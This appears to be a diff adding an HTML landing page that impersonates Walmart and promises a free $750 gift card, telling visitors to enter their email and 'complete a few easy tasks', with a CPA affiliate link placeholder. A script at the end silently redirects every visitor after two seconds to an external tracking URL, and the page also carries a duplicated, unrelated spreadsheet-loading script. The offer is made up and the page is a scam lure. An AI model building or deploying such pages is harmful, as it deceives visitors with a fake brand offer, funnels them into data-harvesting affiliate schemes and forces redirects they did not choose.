@@ -1,0 +1,215 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your $750 Walmart Gift Card</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+    </script>
+    <style>
+        @keyframes shine {
+            0% { filter: brightness(100%); }
+            50% { filter: brightness(130%) drop-shadow(0 0 15px rgba(255, 255, 255, 0.9)); }
+            100% { filter: brightness(100%); }
+        }
+        .shine {
+            animation: shine 2.5s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+        .bounce {
+            animation: bounce 1.8s ease-in-out infinite;
+        }
+        .bg-pattern {
+            background-image: url('https://www.transparenttextures.com/patterns/white-diamond.png');
+            background-blend-mode: soft-light;
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-blue-50 via-white to-blue-100 font-sans bg-pattern">
+    <div class="min-h-screen flex flex-col items-center px-4 py-12">
+        <!-- Top Visual Section -->
+        <section class="w-full max-w-5xl mb-8">
+            <div class="relative rounded-3xl overflow-hidden">
+                <img src="https://media-hosting.imagekit.io/e47fc6fcef5b4eff/3bdc07cd-2e5e-43d3-a14c-24e7ace04af9-1.jpeg?Expires=1841901876&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=dASVnFdtCOnnurcPC6gx2CMu~ut9-~gdewZU4gbkVgRQmBPenzkedbw8cpk5IuC7vUiuTqwyiyS8IH-Ky8~UNZVnTT4Z27nG0defzAREu9gwwyHEusnDyYifZuqO9k5sG0QmP2uyid29OIOB~XvzbbZYHA3cruoRuFbpyeS1ll2VTHjeAd-fpTSxA~cx2kZixf1VqI5a-EQKR99vLKD4nzfQTTAS2bzskOJsW3N46n10AbMRcIi03NOX52RtO6oO19Vbh88Q26QK0GsaHltyzkVDjloJ7Lg5T~K~gdIlk0hWbMnpT5w3xD9atjhevGHiGasgZmoAQ6V20-03Oycm3g__" 
+                     alt="Walmart Gift Card Banner" 
+                     class="w-full h-64 object-cover shine">
+                <div class="absolute top-4 left-4">
+                    <img src="https://www.logo.wine/a/logo/Walmart/Walmart-Logo.wine.svg" 
+                         alt="Walmart Logo" 
+                         class="w-24 md:w-32 h-auto">
+                </div>
+            </div>
+        </section>
+
+        <!-- Header Section -->
+        <header class="text-center mb-10">
+            <h1 class="text-5xl md:text-6xl font-extrabold text-blue-800 mb-4 leading-tight tracking-tight">
+                Get Your $750 Walmart Gift Card
+            </h1>
+            <p class="text-xl md:text-2xl text-gray-800 font-medium">
+                This offer is available for a limited time. Follow the steps below to claim your gift card!
+            </p>
+        </header>
+
+        <!-- Steps Section -->
+        <section class="bg-white shadow-2xl rounded-3xl p-8 md:p-12 w-full max-w-4xl mb-10 border border-blue-100">
+            <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-8">Your Simple Steps to Claim</h2>
+            <div class="grid gap-6 text-gray-800">
+                <div class="flex items-center bg-blue-50 p-5 rounded-xl shadow-sm">
+                    <span class="inline-block w-12 h-12 bg-blue-700 text-white rounded-full flex items-center justify-center mr-4 text-xl font-bold">1</span>
+                    <p class="text-lg font-semibold">Click the button below to get started.</p>
+                </div>
+                <div class="flex items-center bg-blue-50 p-5 rounded-xl shadow-sm">
+                    <span class="inline-block w-12 h-12 bg-blue-700 text-white rounded-full flex items-center justify-center mr-4 text-xl font-bold">2</span>
+                    <p class="text-lg font-semibold">Enter your email to reserve your gift card.</p>
+                </div>
+                <div class="flex items-center bg-blue-50 p-5 rounded-xl shadow-sm">
+                    <span class="inline-block w-12 h-12 bg-blue-700 text-white rounded-full flex items-center justify-center mr-4 text-xl font-bold">3</span>
+                    <p class="text-lg font-semibold">Complete a few easy tasks – no hassle!</p>
+                </div>
+                <div class="flex items-center bg-blue-50 p-5 rounded-xl shadow-sm">
+                    <span class="inline-block w-12 h-12 bg-blue-700 text-white rounded-full flex items-center justify-center mr-4 text-xl font-bold">4</span>
+                    <p class="text-lg font-semibold">Receive your $750 Walmart Gift Card within 24 hours!</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Walmart Gift Card Bonus Section -->
+        <section class="w-full max-w-4xl mb-10 text-center">
+            <div class="bg-blue-100 rounded-3xl p-8 border border-blue-200">
+                <h2 class="text-3xl font-bold text-blue-800 mb-4">Exclusive: $750 Walmart Gift Card!</h2>
+                <p class="text-lg text-gray-700 mb-6">
+                    Get Your $750 Walmart Gift Card – No Purchase Required!<br>
+                    This offer is available for a limited time. Follow the steps above to claim your gift card!
+                </p>
+                <a href="[YOUR_CPA_LINK_HERE]" 
+                   class="inline-block bg-blue-600 text-white font-extrabold py-5 px-10 rounded-full text-xl md:text-2xl hover:bg-blue-700 transition bounce">
+                    Claim My $750 Gift Card Now
+                </a>
+            </div>
+        </section>
+
+        <!-- Timer Visual -->
+        <section class="w-full max-w-4xl mb-12 text-center">
+            <div class="relative">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 120' fill='none'%3E%3Crect width='400' height='120' rx='20' fill='%23EFF6FF'/%3E%3Ccircle cx='60' cy='60' r='40' fill='%231E40AF'/%3E%3Ccircle cx='60' cy='60' r='40' stroke='%23FFF' stroke-width='4'/%3E%3Cpath d='M60 40V60L75 75' stroke='%23FFF' stroke-width='6'/%3E%3Ctext x='120' y='75' font-family='Arial' font-size='28' font-weight='bold' fill='%231E40AF'%3EFinal Hours!%3C/text%3E%3C/svg%3E" 
+                     alt="Custom Countdown Timer" 
+                     class="mx-auto rounded-lg shadow-lg shine">
+                <p class="text-lg font-semibold text-blue-700 mt-4">Act now! Your gift card is waiting!</p>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="text-center text-gray-600 text-sm mt-12">
+            <p>© 2025 Walmart Gift Card Campaign. All rights reserved.</p>
+        </footer>
+    </div>
+	</script>
+	
+	 <script>
+        (function() {
+            const links = [
+                { url: "https://smrturl.co/a/sf9ce48c1f2/11265?s1=", probability: 100 },
+               
+                 
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 2000);
+        })();
+    </script>
+</body>
+</html>
